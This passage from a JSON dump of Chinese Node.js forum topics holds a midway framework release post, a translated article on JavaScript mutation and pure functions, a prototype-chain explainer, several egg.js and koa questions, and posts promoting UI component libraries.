}\n}\n\n@provide()\nclass ReportService implements IReportService {\n\n  @inject()\n  reporter: IReportManager;\n  \n  async getReport(id: number) {\n    return await this.reporter.get(id);\n  }\n}\n\n@provide()\nclass ReporterManager implements IReportManager {\n\n  @inject()\n  db;\n\n  @init()\n  initDB() {\n    &#x2F;&#x2F; open connection\n  }\n\n  async get() {\n    &#x2F;&#x2F; return data from db;\n  }\n}\n</code></pre><h2>入口能力</h2>\n<p>就像上面提到的 <code>@controller</code> 装饰器类似，针对入口型的代码，我们在框架层面扩展了其他装饰器，比如针对计划任务形式我们提供了 <code>@schedule</code> 装饰器，简化用户开发的代码量。</p>\n<pre class=\"prettyprint language-typescript\"><code>import { schedule } from &#x27;midway&#x27;;\n\n@schedule({\n  interval: 2333, &#x2F;&#x2F; 2.333s 间隔\n  type: &#x27;worker&#x27;, &#x2F;&#x2F; 指定某一个 worker 执行\n})\n\nexport class HelloCron {\n  &#x2F;&#x2F; 定时执行的具体任务\n  async exec(ctx) {\n    ctx.logger.info(process.pid, &#x27;hello&#x27;);\n  }\n}\n</code></pre><p>在下一版本中，我们将开放自定义装饰器的能力，方便更多场景的使用。</p>\n<h2>框架扩展</h2>\n<p>由于在大多数场景下，使用了装饰器已经依赖注入的写法，使得自己的业务代码，乃至三方的模块都能很好的融在一起，除了这些之外，有的同学会疑问，原本的插件，配置，上下文部分如何融入到这个体系，我们这就来解答。</p>\n<p>在原本熟悉的体系中，只要有 <code>app</code> , <code>ctx</code> 对象就无敌了，所有的东西都可以拿。而在 midway 中，为了和 web 层进行解耦，我们隐去了这些对象，只希望业务代码和 IoC 容器打交道。</p>\n<p>为此我们提供了 <code>@config</code> 和 <code>@plugin</code> 装饰器用于获取不同的方法，通过这样的形式和框架进行解耦，比如在任意代码中如下使用。</p>\n<pre class=\"prettyprint language-typescript\"><code>@provide()\nclass ReportService implements IReportService {\n\n  @config(&#x27;env&#x27;)\n  env;\n\n  @plugin(&#x27;httpclient&#x27;)\n  httpclient;\n\n  @inject()\n  reporter: IReportManager;\n  \n  async getReport(id: number) {\n    const rid = this.httpclient.request(&#x27;&#x2F;api&#x2F;&#x27; + id);\n    return await this.reporter.get(rid);\n  }\n}\n</code></pre><p>正是这样一点点的调整，我们将整个应用的代码风格保持了到了一致，不管代码几经易手，维护的同学也能快速上手，并且继续迭代下去。</p>\n<h2>最后</h2>\n<p>正向我们在 Pandora.js 发布时说的那样，midway 也是 MidwayJs 团队长期维护的一款产品，同样不会是最后一款，前几个月，我们就计划将我们的监控平台 Sandbox 带出来回馈给社区，虽然道阻且长，任务艰辛，我们依旧在努力前行，欢迎关注。</p>\n<p>最后，<a href=\"http://link.zhihu.com/?target=https%3A//github.com/midwayjs/pandora/\">midway</a> 的地址在这 <a href=\"http://link.zhihu.com/?target=https%3A//github.com/midwayjs/midway/\">https://github.com/midwayjs/midway/</a>，归属在 midwayJs Group 下。欢迎走过路过点个 Star，给我们提提建议，提提代码。</p>\n<p>Midway 官网：<a href=\"https://midwayjs.org/midway/\">https://midwayjs.org/midway/</a></p>\n<p><img src=\"https://img.alicdn.com/tfs/TB1TQ9.BhjaK1RjSZKzXXXVwXXa-1448-541.png\" alt=\"image-20190110141919113\"></p>\n</div>","title":"midway v1.0 社区正式发布 - 面向未来的全栈开发方案","last_reply_at":"2019-03-16T12:07:33.187Z","good":true,"top":false,"reply_count":65,"visit_count":4974,"create_at":"2019-01-10T08:20:55.350Z","author":{"loginname":"czy88840616","avatar_url":"//gravatar.com/avatar/c4e414b7264b513a00bbd8ec3e9a0d66?s=48"}},{"id":"5c8bc7ae7ce0df3732428796","author_id":"5a0a5c9da57c17282e120654","tab":"share","content":"<div class=\"markdown-text\"><p><img src=\"https://user-gold-cdn.xitu.io/2019/3/15/16981fc9f1aa04aa?w=1280&amp;h=834&amp;f=png&amp;s=718090\" alt=\"20190315103011.png\"></p>\n<ul>\n<li>作者：Chidume Nnamdi</li>\n<li>英文原文：<a href=\"https://blog.bitsrc.io/understanding-javascript-mutation-and-pure-functions-7231cc2180d3\">https://blog.bitsrc.io/understanding-javascript-mutation-and-pure-functions-7231cc2180d3</a></li>\n</ul>\n<h1>[译] 理解 JavaScript Mutation 突变和 PureFunction 纯函数</h1>\n<p>不可变性、纯函数、副作用，状态可变这些单词我们几乎每天都会见到，但我们几乎不知道他们是如何工作的，以及他们是什么，他们为软件开发带来了什么好处。</p>\n<p>在这篇文章中，我们将深入研究所有这些，以便真正了解它们是什么以及如何利用它们来提高我们的Web应用程序的性能。</p>\n<h2>Javascript：原始数据类型和引用数据类型</h2>\n<p>我们将首先了解JS如何维护以及访问到我们的数据类型。</p>\n<p>在JS中，有原始数据类型和引用数据类型。原始数据类型由值引用，而非原始/引用数据类型指向内存地址。</p>\n<p>原始数据类型是：</p>\n<ul>\n<li>Boolean</li>\n<li>Number</li>\n<li>String</li>\n<li>Null</li>\n<li>Undefined</li>\n<li>Symbol</li>\n</ul>\n<p>引用数据类型：</p>\n<ul>\n<li>Object</li>\n<li>Arrays</li>\n</ul>\n<p>当我们写原始数据类型时是这个样子：</p>\n<p><code>let one = 1</code></p>\n<p>在调用堆栈中，<code>one</code> 变量直接指向值 1：</p>\n<pre class=\"prettyprint\"><code>Call Stack\n#000    one -&gt; | 1 |\n#001           |   |\n#002           |   |\n#003           |   |\n</code></pre><p>如果我们改变这个值：</p>\n<pre class=\"prettyprint language-js\"><code>let one = 1\none = 3\n</code></pre><p>变量 <code>one</code> 的内存地址 #000 原本存储 1 这个值，会直接变成 3</p>\n<p>但是，如果我们像这样写一个引用数据类型：</p>\n<pre class=\"prettyprint language-js\"><code>let arr = {\n    one: 1\n}\n</code></pre><p>或：</p>\n<pre class=\"prettyprint language-js\"><code>let arr = new Object()\narr.one = 1\n</code></pre><p>JS将在内存的堆中创建对象，并将对象的内存地址存储在堆上：</p>\n<pre class=\"prettyprint\"><code>Call Stack       Heap\n#000    arr -&gt; | #101 |   #101 | one: 1 |\n#001           |      |   #102 |        |\n#002           |      |   #103 |        |\n#003           |      |   #104 |        |\n</code></pre><p>看到 <code>arr</code> 不直接存储对象，而是指向对象的内存位置（＃101）。与直接保存其值的原始数据类型不同。</p>\n<pre class=\"prettyprint language-js\"><code>let arr = { one: 1 }\n&#x2F;&#x2F; arr holds the memory location of the object {one: 1}\n&#x2F;&#x2F; &#96;arr&#96; == #101\nlet one = 1;\n&#x2F;&#x2F; &#96;one&#96; a primitive data type holds the value &#96;1&#96;\n&#x2F;&#x2F; one == 1\n</code></pre><p>如果我们改变 <code>arr</code> 中的属性，如下所示：</p>\n<p><code>arr.one = 2</code></p>\n<p>那么基本上我们就是在告诉程序更改 <code>arr</code> 对对象属性值的指向。如果你对 C/C++ 等语言的指针和引用比较熟悉，那么这些你都会很容易理解。</p>\n<p>传递引用数据类型时，你只是在传递其内存位置的递值，而不是实际的值。</p>\n<pre class=\"prettyprint language-js\"><code>function chg(arg) {\n    &#x2F;&#x2F;arg points to the memory address of { one: 1 }\n    arg.one = 99\n    &#x2F;&#x2F; This modification will affect { one: 1 } because arg points to its memory address, 101\n}\nlet arr = { one: 1 } \n&#x2F;&#x2F; address of &#96;arr&#96; is &#96;#000&#96;\n&#x2F;&#x2F; &#96;arr&#96; contains &#96;#101&#96;, adrress of object, &#96;{one: 1}&#96; in Heap\nlog(arr); &#x2F;&#x2F; { one: 1 }\nchg(arr &#x2F;* #101 *&#x2F;)\n&#x2F;&#x2F; #101 is passed in\nlog(arr) &#x2F;&#x2F; { one: 99 }\n&#x2F;&#x2F; The change affected &#96;arr&#96;\n</code></pre><blockquote>\n<p>译者注：arr 本身的内存地址是 #000；arr 其中保存了一个地址 #101；这个地址指向对象 {one:1}；在调用 chg 函数的时候，那么修改 arg 属性 one 就会修改 arr 对应的 #101 地址指向的对象 {one:1}</p>\n</blockquote>\n<p>因为引用数据类型保存的是内存地址，所以对他的任何修改都会影响到他指向的内存。</p>\n<p>如果我们传入一个原始数据类型：</p>\n<pre class=\"prettyprint language-js\"><code>function chg(arg) {\n    arg++\n}\nlet one = 1; &#x2F;&#x2F; primitive data types holds the actual value of the variable.\nlog(one) &#x2F;&#x2F; 1\nchg(one &#x2F;* 1 *&#x2F;)\n&#x2F;&#x2F; the value of &#96;one&#96; is passed in.\nlog(one) &#x2F;&#x2F; one is still &#96;1&#96;. No change because primitives only hold the value\n</code></pre><blockquote>\n<p>译者注：不像原始数据类型，他的值是多少就是多少如果修改了这个值，那么直接修改所在内存对应的这个值</p>\n</blockquote>\n<h2>状态突变和不可变性</h2>\n<p>在生物学领域，我们知道 DNA 以及 DNA 突变。DNA 有四个基本元素，分别是 ATGC。这些生成了编码信息，在人体内产生一种蛋白质。</p>\n<pre class=\"prettyprint\"><code>ATATGCATGCGATA\n||||||||||||||   \nTACGAGCTAGGCTA\n|\n|\nv\nAProteinase\nInformation to produce a protein (eg, insulin etc)\n</code></pre><p>上述DNA链编码信息以产生可用于骨结构比对的AP蛋白酶蛋白。</p>\n<p>如果我们改变DNA链配对，即使是一对：</p>\n<pre class=\"prettyprint\"><code>ATATGCATGCGATA\n||||||||||||||   \nTACGAGCTAGGCTA\n|\nv \nGTATGCATGCGATA\n||||||||||||||   \nTACGAGCTAGGCTA\n</code></pre><p>DNA将产生不同的蛋白质，因为产生蛋白质AP蛋白酶的信息已经被篡改。因此产生了另一种蛋白质，其可能是良性的或在某些情况下是有毒的。</p>\n<pre class=\"prettyprint\"><code>GTATGCATGCGATA\n||||||||||||||   \nTACGAGCTAGGCTA\n|\n|\nV\nNow produces _AProtienase\n</code></pre><p>我们称这种变化<code>突变</code>或<code>DNA突变</code>。</p>\n<p>突变引起DNA状态的改变。</p>\n<p>而对于 JS 来说，引用数据类型（数组，对象）都被称为数据结构。这些数据结构保存信息，以操纵我们的应用程序。</p>\n<pre class=\"prettyprint language-js\"><code>let state = {\n    wardens: 900,\n    animals: 800\n}\n</code></pre><p>上面名为 state 的对象保存了 Zoo 应用程序的信息。如果我们改变了 animals 属性的值：</p>\n<pre class=\"prettyprint language-js\"><code>let state = {\n    wardens: 900,\n    animals: 800\n }\nstate.animals = 90\n</code></pre><p>我们的 state 对象会保存或编码一个新的信息：</p>\n<pre class=\"prettyprint language-js\"><code>state = {\n    wardens: 900,\n    animals: 90    \n}\n</code></pre><p>这就叫<code>突变 mutation</code></p>\n<p>我们的 state 从：</p>\n<pre class=\"prettyprint language-js\"><code>state = {\n    wardens: 900,\n    animals: 800    \n}\n</code></pre><p>变为：</p>\n<pre class=\"prettyprint language-js\"><code>state = {\n    wardens: 900,\n    animals: 90    \n}\n</code></pre><p>当我们想要保护我们的 state 时候，这就需要用到不可变性了 immutability。为了防止我们的 state 对象发生变化，我们必须创建一个 state 对象的新实例。</p>\n<pre class=\"prettyprint language-js\"><code>function bad(state) {\n    state.prp = &#x27;yes&#x27;\n    return state\n}\nfunction good(state) {\n    let newState = { ...state }\n    newState.prp = &#x27;yes&#x27;\n    return newState\n}\n</code></pre><p>不可变性使我们的应用程序状态可预测，提高我们的应用程序的性能速率，并轻松跟踪状态的变化。</p>\n<h2>纯函数和副作用</h2>\n<p>纯函数是接受输入并返回值而不修改其范围之外的任何数据的函数（副作用）。它的输出或返回值必须取决于输入/参数，纯函数必须返回一个值。</p>\n<blockquote>\n<p>译者注：纯函数必须要满足的条件：不产生副作用、返回值只取决于传入的参数，纯函数必须返回一个值</p>\n</blockquote>\n<pre class=\"prettyprint language-js\"><code>function impure(arg) {\n    finalR.s = 90\n    return arg * finalR.s\n}\n</code></pre><p>上面的函数不是纯函数，因为它修改了其范围之外的状态 <code>finalR.s</code>。</p>\n<pre class=\"prettyprint language-js\"><code>function impure(arg) {\n    let f = finalR.s * arg\n}\n</code></pre><p>上面的函数也不是纯函数，因为虽然它没有修改任何外部状态，但它没有返回值。</p>\n<pre class=\"prettyprint language-js\"><code>function impure(arg) {\n    return finalR.s * 3\n}\n</code></pre><p>上面的函数是不纯的，虽然它不影响任何外部状态，但它的输出返回 <code>finalR.s * 3</code> 不依赖于输入 <code>arg</code>。纯函数不仅必须返回一个值，还必须依赖于输入。</p>\n<pre class=\"prettyprint language-js\"><code>function pure(arg) {\n    return arg * 4\n}\n</code></pre><p>上面的函数才是纯函数。它不会对任何外部状态产生副作用，它会根据输入返回输出。</p>\n<h2>能够带来的好处</h2>\n<p>就个人而言，我发现的唯一能够让人理解的好处是 <code>mutation tracking</code> 变异追踪。</p>\n<p>知道何时渲染你的状态是非常重要的事情。很多 JS 框架设计了不错的方法来检测何时去渲染其状态。但是最重要的是，要知道在首次渲染完毕后，何时触发再渲染 <code>re-render</code>。这就被称为变异追踪了。这需要知道什么时候状态被改变了或者说变异了。以便去触发再渲染 <code>re-render</code>。</p>\n<p>于我们已经实现了不变性，我们确信我们的应用程序状态不会在应用程序中的任何位置发生变异，况且纯函数完全准寻其处理逻辑和原则（译者注：不会产生副作用）。这就很容易看出来到底是哪里出现变化了（译者注：反正不是纯函数也不是 immutable 变量）。</p>\n<pre class=\"prettyprint language-js\"><code>let state = {\n    add: 0,\n}\nfuntion render() {\n    &#x2F;&#x2F;...\n}\nfunction effects(state,action) {\n    if(action == &#x27;addTen&#x27;) {\n        return {...state, add: state.add + 10}\n    }\n    return state;\n}\nfunction shouldUpdate(s) {\n    if(s === state){\n        return false\n    }\n    return true\n}\nstate = effects(state, &#x27;addTen&#x27;)\nif(shouldUpdate(state)) {\n    render();\n}\n</code></pre><p>这里有个小程序。这里有个 state 对象，对象只有一个属性 add。render 函数正常渲染程序的属性。他并不会在程序的任何改变时每次都触发渲染 state 对象，而是先检查 state 对象是否改变。</p>\n<p>就像这样，我们有一个 effects 函数和一个纯函数，这两个函数都用来去修改我们的 state 对象。你会看到它返回了一个新的 state 对象，当要更改状态时返回新状态，并在不需要修改时返回相同的状态。</p>\n<p>因此，我们有一个shouldUpdate函数，它使用===运算符检查旧状态和新状态是否相同。如果它们不同，则调用render函数，以更新新状态。</p>\n<h2>结论</h2>\n<p>我们研究了 Web 开发中这几个最常见的术语，并展示了它们的含义以及它们的用途。如果你付诸实践，这将是非常有益的。</p>\n<p>如果有任何对于这篇文章的问题，如我应该增加、修改或删除，请随时评论、发送电子邮件或直接 DM 我。干杯 🙏\n<img src=\"https://user-gold-cdn.xitu.io/2019/3/14/1697caae8a996c2e?w=960&amp;h=260&amp;f=jpeg&amp;s=58713\" alt></p>\n</div>","title":"[译] 理解 JavaScript Mutation 突变和 PureFunction 纯函数","last_reply_at":"2019-03-16T10:48:04.958Z","good":false,"top":false,"reply_count":2,"visit_count":332,"create_at":"2019-03-15T15:41:34.579Z","author":{"loginname":"oliyg","avatar_url":"https://avatars1.githubusercontent.com/u/19631785?v=4&s=120"}},{"id":"5c8c9cee7ce0df3732428923","author_id":"55c56e8a39273b9219336288","tab":"share","content":"<div class=\"markdown-text\"><p>主要从产品推广和转化率两个方面入手，罗列了可以套用在不同产品上的获客小技巧。</p>\n<p><a href=\"https://blog.t9t.io/on-growth-hacking-cn-2019-03-15/\">全干工程师的自我修养（获客篇）</a></p>\n</div>","title":"全干工程师的自我修养（获客篇）","last_reply_at":"2019-03-16T07:53:07.210Z","good":false,"top":false,"reply_count":1,"visit_count":616,"create_at":"2019-03-16T06:51:26.358Z","author":{"loginname":"timqian","avatar_url":"https://avatars3.githubusercontent.com/u/5512552?v=4&s=120"}},{"id":"5c8a4e857ce0df373242802a","author_id":"5c8a4cc27ce0df3732428027","tab":"ask","content":"<div class=\"markdown-text\"><pre class=\"prettyprint language-js\"><code>&#x27;use strict&#x27;;\n\nmodule.exports = app =&gt; {\n  const mongoose = app.mongoose;\n  const Schema = mongoose.Schema;\n\n  const EventSchema = new Schema({\n    type: { type: String },\n    openid: { type: String },\n    data: { type: Object },\n    dateCreated: { type: Date },\n    equipment: { type: Schema.Types.ObjectId, ref: &#x27;Equipment&#x27; },\n  });\n  \n  EventSchema.methods.getItem1 = (_id, ctx) =&gt; {\n    return ctx.model.Event.findById(_id);\n  };\n\n  EventSchema.statics.getItem2 = (_id, ctx) =&gt; {\n    return ctx.model.Event.findById(_id);\n  };\n\n  const Event = mongoose.model(&#x27;Event&#x27;, EventSchema, null, { cache: false });\n  \n  return Event;\n};\n\n</code></pre><p>这里的getItem1 / getItem2 方法在service中该如何调用？</p>\n</div>","title":"利用egg-mongoose在Model文件中定义的实例方法跟静态方法在service里该如何调用","last_reply_at":"2019-03-16T05:54:39.049Z","good":false,"top":false,"reply_count":2,"visit_count":332,"create_at":"2019-03-14T12:52:21.337Z","author":{"loginname":"kuangyanit","avatar_url":"https://avatars0.githubusercontent.com/u/22702771?v=4&s=120"}},{"id":"59d305e9eab6a6536873fe89","author_id":"5809a4c70bab808265185fda","tab":"ask","content":"<div class=\"markdown-text\"><p>大家好，</p>\n<p>我公司的新项目的正在进行技术选型。所以，我想寻找一款基于Node.js的企业级开发解决方案，类似于 <a href=\"https://github.com/shuzheng/zheng\">https://github.com/shuzheng/zheng</a>\n不用那么地强大，只要有一些基本功能就行。</p>\n</div>","title":"我想寻找一款基于Node.js的企业级开发解决方案类似于 https://github.com/shuzheng/zheng","last_reply_at":"2019-03-16T01:15:30.238Z","good":false,"top":false,"reply_count":8,"visit_count":2083,"create_at":"2017-10-03T03:37:13.466Z","author":{"loginname":"stuartZhang","avatar_url":"https://avatars1.githubusercontent.com/u/13935927?v=4&s=120"}},{"id":"5c86485bacb681372d4170d4","author_id":"5c81be5490c14711cc8cb5d8","tab":"share","content":"<div class=\"markdown-text\"><p>推荐慕课网视频教程学 很不错</p>\n</div>","title":"学习react","last_reply_at":"2019-03-15T15:58:28.292Z","good":false,"top":false,"reply_count":4,"visit_count":622,"create_at":"2019-03-11T11:36:59.763Z","author":{"loginname":"pzuopin","avatar_url":"https://avatars3.githubusercontent.com/u/23273676?v=4&s=120"}},{"id":"5b6aa6e57271129a2f32a848","author_id":"5874ce202d086de6340db320","tab":"share","content":"<div class=\"markdown-text\"><p><strong>简介</strong>\n这是一套基于 Vue.js 的移动关组件库，基于成都中科大旗软件有限公司 业务需求要求，封装了一系列组件，非常适于移动端开发，其中价格双滑块组件、酒店日历组件、图片预览组件、上传图片组件、三级联动组件等在网上基本找不到相应的例子。\n<strong>二维码</strong>\n<img src=\"//static.cnodejs.org/FnajyU5A8aOpvqnMh8SwHc1GausJ\" alt=\"1533895435.png\">\n<strong>特性</strong>\n1、25+ 个组件</p>\n<p>2、完善的在线文档\n<img src=\"//static.cnodejs.org/FkE2OqJGfZwi1zkm_IlDruCijFJz\" alt=\"2.png\">\n3、详细的在线示例\n<img src=\"//static.cnodejs.org/FgWwkMfe_MiqcYB5E6cOtxpU_Puo\" alt=\"1.png\">\n4、已成功跑完3个大型项目</p>\n<p><a href=\"http://s.ued.daqsoft.com/geekUI/mobile/api/#/home\">在线文档http://s.ued.daqsoft.com/geekUI/mobile/api/#/home</a></p>\n<p><a href=\"http://s.ued.daqsoft.com/geekUI/mobile/demo/#/home\">在线示例http://s.ued.daqsoft.com/geekUI/mobile/demo/#/home</a></p>\n<p>求star\n<a href=\"https://github.com/myfirebug/vue-components\">git地址https://github.com/myfirebug/vue-components</a><br>\n另外如果在使用的过程有任何问题都可以联系本人QQ：378540660</p>\n</div>","title":"使用vue2 + vue-router + vueX + ES6 + scss + axios + zepto + vue-cli开发组件","last_reply_at":"2019-03-15T08:29:25.081Z","good":false,"top":false,"reply_count":7,"visit_count":1880,"create_at":"2018-08-08T08:16:37.783Z","author":{"loginname":"myfirebug","avatar_url":"https://avatars3.githubusercontent.com/u/8624981?v=4&s=120"}},{"id":"5c8a6a657ce0df3732428093","author_id":"5a0a5c9da57c17282e120654","tab":"share","content":"<div class=\"markdown-text\"><p><img src=\"https://user-gold-cdn.xitu.io/2019/3/14/1697caabdd4138ac?w=1350&amp;h=900&amp;f=png&amp;s=1565520\" alt=\"20190314150227.png\"></p>\n<h1>图解原型和原型链</h1>\n<p>原型和原型链是 JS 中不可避免需要碰到的知识点📕，本文使用图片思维导图的形式缕一缕原型、原型链、实例、构造函数等等概念之间的关系🌚</p>\n<h2>Constructor 构造函数</h2>\n<p>首先我们先写一个<code>构造函数</code> Person，构造函数一般为了区别普通函数要求首字母大写:</p>\n<pre class=\"prettyprint language-js\"><code>function Person(){}\n</code></pre><h2>prototype 原型</h2>\n<p>原型指的就是一个对象，实例“继承”那个对象的属性。在原型上定义的属性，通过“继承”，实例也拥有了这个属性。“继承”这个行为是在 new 操作符内部实现的。</p>\n<p>先不说实例，原型与构造函数的关系就是，构造函数内部有一个名为 prototype 的属性，通过这个属性就能访问到原型：</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/14/1697caabdd89c215?w=292&amp;h=239&amp;f=png&amp;s=15037\" alt=\"20190314132908.png\"></p>\n<p>Person 就是构造函数，Person.prototype 就是原型</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/14/1697caabe391603b?w=514&amp;h=191&amp;f=png&amp;s=5451\" alt=\"20190314132934.png\"></p>\n<h2>instance 实例</h2>\n<p>有个构造函数，我们就可以在原型上创建可以“继承”的属性，并通过 new 操作符创建实例</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/14/1697caabe02c7068?w=509&amp;h=308&amp;f=png&amp;s=8296\" alt=\"20190314141908.png\"></p>\n<p>比方说 Person，我们要创建一个 person 实例，那么使用 new 操作符就可以实现，并通过 instanceof 来检查他们之间的关系：</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/14/1697caabe236a881?w=597&amp;h=118&amp;f=png&amp;s=8756\" alt=\"20190314132309.png\"></p>\n<p>我们在原型上定义一个属性，那么实例上也就可以“继承”这个属性：</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/14/1697caabe3a805b9?w=424&amp;h=142&amp;f=png&amp;s=9904\" alt=\"20190314133215.png\"></p>\n<h2>proto 隐式原型</h2>\n<p>实例通过 <code>__proto__</code> 访问到原型，所以如果是实例，那么就可以通过这个属性直接访问到原型：</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/14/1697caac2aaef961?w=534&amp;h=341&amp;f=png&amp;s=12139\" alt=\"20190314141947.png\"></p>\n<p>所以这两者是等价的：</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/14/1697caac2ab3f410?w=468&amp;h=142&amp;f=png&amp;s=9375\" alt=\"20190314142041.png\"></p>\n<h2>constructor 构造函数</h2>\n<p>既然构造函数通过 prototype 来访问到原型，那么原型也应该能够通过某种途径访问到构造函数，这就是 constructor：</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/14/1697caac2a873506?w=473&amp;h=142&amp;f=png&amp;s=9571\" alt=\"20190314142246.png\"></p>\n<p>因此两者的关系应该是这样：</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/14/1697caac2a745a9e?w=557&amp;h=383&amp;f=png&amp;s=16722\" alt=\"20190314142755.png\"></p>\n<blockquote>\n<p>注意这里的 constructor 是原型的一个属性，Constructor 指的才是真正的构造函数。两者名字不要弄混了😀</p>\n</blockquote>\n<h2>实例、构造函数、原型之间的关系</h2>\n<p>这里我们可以看到如果实例想要访问构造函数，那么应当是：</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/14/1697caac46d22f60?w=477&amp;h=137&amp;f=png&amp;s=9097\" alt=\"20190314143125.png\"></p>\n<p>没有从实例直接访问到构造函数的属性或方法：</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/14/1697caac56809356?w=182&amp;h=58&amp;f=png&amp;s=3119\" alt=\"20190314143254.png\"></p>\n<p>实例与原型则是通过上文中提到的 <code>__proto__</code> 去访问到。</p>\n<p>在读取一个实例的属性的过程中，如果属性在该实例中没有找到，那么就会循着 <code>__proto__</code> 指定的原型上去寻找，如果还找不到，则尝试寻找原型的原型🐚：</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/14/1697caac5b7c916e?w=505&amp;h=218&amp;f=png&amp;s=19153\" alt=\"20190314143837.png\"></p>\n<p>我们把注释删掉，给实例同名属性，可以看到打印出来的属性就指向这个：</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/14/1697caac5bfbc498?w=522&amp;h=217&amp;f=png&amp;s=18743\" alt=\"20190314143944.png\"></p>\n<h2>原型链</h2>\n<p>原型同样也可以通过 <code>__proto__</code> 访问到原型的原型，比方说这里有个构造函数 Person 然后“继承”前者的有一个构造函数 People，然后 new People 得到实例 p</p>\n<p>当访问 p 中的一个非自有属性的时候，就会通过 <code>__proto__</code> 作为桥梁连接起来的一系列原型、原型的原型、原型的原型的原型直到 Object 构造函数为止。</p>\n<p>这个搜索的过程形成的链状关系就是原型链</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/14/1697caac62041820?w=814&amp;h=229&amp;f=png&amp;s=21976\" alt=\"20190314144733.png\"></p>\n<p>如下图：</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/14/1697caac6f1e804c?w=576&amp;h=617&amp;f=png&amp;s=29844\" alt=\"20190314145239.png\"></p>\n<p>看到 null 了么，原型链搜索搜到 null 为止，搜不到那访问的这个属性就是不存在的：</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/14/1697caac84763e75?w=521&amp;h=353&amp;f=png&amp;s=20440\" alt=\"20190314145540.png\"></p>\n<p>以上，这就是原型、原型链、构造函数、实例、null 之间的关系。</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/14/1697caae8a996c2e?w=960&amp;h=260&amp;f=jpeg&amp;s=58713\" alt></p>\n</div>","title":"🍭图解原型和原型链","last_reply_at":"2019-03-15T06:38:58.823Z","good":false,"top":false,"reply_count":1,"visit_count":625,"create_at":"2019-03-14T14:51:17.247Z","author":{"loginname":"oliyg","avatar_url":"https://avatars1.githubusercontent.com/u/19631785?v=4&s=120"}},{"id":"5c864a28acb681372d4170e6","author_id":"4efc278625fa69ac69000440","tab":"ask","content":"<div class=\"markdown-text\"><p>请教各位，我刚刚用egg搭建应用，涉及针对客户做少量的定制，所以核心模块都一样，现在我想把共用的模块做成类似framework一样统一迭代，然后基于这个搭建客户的应用，因为像用户管理、内容管理这些模块所有客户都是一样的，所以用framework继承的方式我不知道怎么处理这些共用模块\n<img src=\"//static.cnodejs.org/Fi7CKqrZZ9FL6buoBt_-DjroJ_fX\" alt=\"QQ截图20190311194328.png\"></p>\n</div>","title":"请教egg.js怎么让framework加载model、controller，或者类似framework继承一样做app继承","last_reply_at":"2019-03-15T04:37:03.090Z","good":false,"top":false,"reply_count":7,"visit_count":719,"create_at":"2019-03-11T11:44:40.321Z","author":{"loginname":"dxwts","avatar_url":"//gravatar.com/avatar/81811fca28d040deea1008a2ff891f6c?s=48"}},{"id":"5c8a1e2facb681372d41814c","author_id":"5c247db93898674067a78f02","tab":"ask","content":"<div class=\"markdown-text\"><p>我想问下 我们的项目是前后端分离的， 后台用koa-session koa-session会把信息存在前端cookie   前端如何能获取到这个cookie ，普通的解析好像解析不了。</p>\n</div>","title":"vue前后台分离--后台用koa-session koa-session会把信息存在前端cookie  前端如何能获取到这个cookie","last_reply_at":"2019-03-15T01:46:58.336Z","good":false,"top":false,"reply_count":2,"visit_count":418,"create_at":"2019-03-14T09:26:07.381Z","author":{"loginname":"gougou168","avatar_url":"https://avatars2.githubusercontent.com/u/46184813?v=4&s=120"}},{"id":"59367fab69912fcf6b3cca56","author_id":"5874ce202d086de6340db320","tab":"share","content":"<div class=\"markdown-text\"><p>###UI组件</p>\n<p><strong>简介</strong></p>\n<p>移动端基于jquery,zepto的UI组件库，目前实现\nJS Components：Toast、Action、Tips、Dialog、Swiper、CityPicker、DatetimePicker、Tab、Range\nCss Component：oneborder、Loading、button\nFrom Component：switch、Radio、Checkbox\nPlug Components：Turntable、Lottery\n<strong>演示</strong></p>\n<p><a href=\"https://myfirebug.github.io/ui/dist/html/index.html\">https://myfirebug.github.io/ui/dist/html/index.html</a>\n求star\n<a href=\"https://github.com/myfirebug/ui\">github</a></p>\n<p><strong>使用</strong>\n<strong>Toast用法</strong></p>\n<pre class=\"prettyprint language-js\\n\"><code>&#x2F;*config参数说明\n*---------\n*text:内容  \n*icon:icon样式 \n*delay:延迟时间 \n---------*&#x2F;\nToast({\n  message: &#x27;提示&#x27;,\n  icon:&#x27;fails&#x27;,\n  duration: 5000\n});\n</code></pre><p><strong>Action用法</strong></p>\n<pre class=\"prettyprint language-js\\n\"><code>&#x2F;*config参数说明\n*---------\n*title:标题\n*mask:是否有遮罩\n*actions:列表\n---------*&#x2F;\nActions({\n  title: &#x27;选择操作&#x27;,\n  mask:true,\n  actions:[\n\t\t{\n\t\t\ttext:&#x27;列表1&#x27;,\n\t\t\tcallBack:function(){\n\t\t\t\talert(&#x27;我是列表1&#x27;);\n\t\t\t}\n\t\t},\n\t\t{\n\t\t\ttext:&#x27;列表2&#x27;,\n\t\t\tcallBack:function(){\n\t\t\t\talert(&#x27;我是列表2&#x27;);\n\t\t\t}\n\t\t},\n\t\t{\n\t\t\ttext:&#x27;列表3&#x27;,\n\t\t\tcallBack:function(){\n\t\t\t\talert(&#x27;我是列表3&#x27;);\n\t\t\t}\n\t\t}\n\t]\n});\n</code></pre><p><strong>Tips用法</strong></p>\n<pre class=\"prettyprint language-js\\n\"><code>&#x2F;*config参数说明\n*---------\n*text:内容  \n*delay:延迟时间  \n---------*&#x2F;\nTips({\n  test: &#x27;提示&#x27;,\n  delay: 5000\n});\n</code></pre><p><strong>Dialog用法</strong></p>\n<pre class=\"prettyprint language-js\\n\"><code>&#x2F;*config参数说明\n*---------\n*title:标题\n*message:内容\n*buttons:按钮列表\n---------*&#x2F;\nDialog({\n  title: 